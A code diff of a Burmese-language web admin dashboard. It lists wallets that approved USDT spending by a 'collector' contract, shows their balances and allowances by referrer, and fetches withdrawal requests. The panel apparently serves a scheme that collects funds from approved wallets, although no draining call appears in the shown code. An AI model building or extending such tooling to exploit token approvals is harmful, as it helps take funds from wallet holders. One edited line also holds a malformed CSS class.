@@ -101,7 +101,7 @@
                 </div>
             </div>
 
-            <!-- Progress Bar for Part 2 (Directly under Part 2 controls) -->
+            <!-- Progress Bar for Part 2 -->
             <div id="progressPart2" class="hidden bg-slate-900 p-3 rounded-xl border border-slate-700 space-y-1.5">
                 <div class="flex justify-between text-[10px] font-mono">
                     <span id="textPart2" class="text-emerald-400">လုပ်ဆောင်နေပါသည်...</span>
@@ -147,7 +147,7 @@
                 <button onclick="loadWithdrawRequests()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Load Requests</button>
             </div>
 
-            <!-- Progress Bar for Part 3 (Directly under Part 3 controls) -->
+            <!-- Progress Bar for Part 3 -->
             <div id="progressPart3" class="hidden bg-slate-900 p-3 rounded-xl border border-slate-700 space-y-1.5">
                 <div class="flex justify-between text-[10px] font-mono">
                     <span id="textPart3" class="text-emerald-400">တောင်းဆိုချက်များ ရှာဖွေနေသည်...</span>
@@ -267,16 +267,32 @@
             }
 
             const tbody = document.getElementById("userTableBody");
-            showProgress(2, "သိမ်းဆည်းထားသော User စာရင်းများကို ဖတ်ရှုနေသည်...", 30);
+            showProgress(2, "ဒေတာများ စတင်ဖတ်ရှုနေသည်...", 20);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                // Use LocalStorage cache to instantly load users without hanging RPC queryFilter
-                let userSet = new Set(JSON.parse(localStorage.getItem("admin_known_users_v4") || "[]"));
+                // Get stored users from cache or start with empty
+                let userArray = JSON.parse(localStorage.getItem("admin_known_users_v4") || "[]");
+                
+                // If cache is empty, try a quick queryFilter on recent 500 blocks just in case
+                if (userArray.length === 0) {
+                    showProgress(2, "Approval Event အသစ်များ ရှာဖွေနေသည်...", 40);
+                    try {
+                        const currentBlock = await provider.getBlockNumber();
+                        const fromBlock = currentBlock > 500 ? currentBlock - 500 : 0;
+                        const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
+                        const logs = await usdtContract.queryFilter(filter, fromBlock, "latest");
+                        let foundSet = new Set();
+                        logs.forEach(l => { if(l.args && l.args.owner) foundSet.add(l.args.owner.toLowerCase()); });
+                        userArray = Array.from(foundSet);
+                    } catch (e) {
+                        console.warn("Event query skipped:", e);
+                    }
+                }
 
-                showProgress(2, "User များ၏ Balance စစ်ဆေးနေသည်...", 60);
+                showProgress(2, "User Balance များကို စစ်ဆေးနေသည်...", 60);
                 const contractOwner = await collectorContract.owner();
                 const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
 
@@ -284,23 +300,20 @@
                 let rowsHtml = "";
                 let validUsers = [];
 
-                const userArray = Array.from(userSet);
                 for (let i = 0; i < userArray.length; i++) {
                     const addr = userArray[i];
                     try {
-                        const [userInfo, balanceBN, allowanceBN] = await Promise.all([
-                            collectorContract.users(addr),
-                            usdtContract.balanceOf(addr),
-                            usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS)
-                        ]);
-
+                        const userInfo = await collectorContract.users(addr);
                         if (!isOwner && userInfo.referrer.toLowerCase() !== adminAddress.toLowerCase()) {
                             continue;
                         }
 
+                        const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
                         if (Number(allowanceBN) === 0) continue;
 
+                        const balanceBN = await usdtContract.balanceOf(addr);
                         validUsers.push(addr);
+
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
                         const allowance = Number(ethers.formatUnits(allowanceBN, 6));
                         totalBalance += balance;
@@ -329,7 +342,7 @@
                             </tr>
                         `;
                     } catch (e) {
-                        console.error("Error fetching user:", addr, e);
+                        console.error("Error with user:", addr, e);
                     }
                 }
 
@@ -338,13 +351,15 @@
                 showProgress(2, "ပြီးဆုံးပါပြီ!", 100);
                 setTimeout(() => hideProgress(2), 800);
 
-                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> အတည်ပြုထားသော (Approved) User များ မရှိသေးပါ။ </td></tr>`;
+                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ </td></tr>`;
                 document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
 
             } catch (err) {
-                console.error(err);
+                console.error("Refresh table error:", err);
                 hideProgress(2);
-                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center.red-400 text-xs"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+            } finally {
+                hideProgress(2);
             }
         }
 
@@ -359,7 +374,7 @@
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const currentBlock = await provider.getBlockNumber();
-                const fromBlock = currentBlock > 2000 ? currentBlock - 2000 : 0;
+                const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0;
 
                 const filter = contract.filters.WithdrawRequested();
                 const events = await contract.queryFilter(filter, fromBlock, "latest");
@@ -394,9 +409,11 @@
 
                 container.innerHTML = html;
             } catch (err) {
-                console.error(err);
+                console.error("Withdraw requests error:", err);
                 hideProgress(3);
                 container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
+            } finally {
+                hideProgress(3);
             }
         }
 
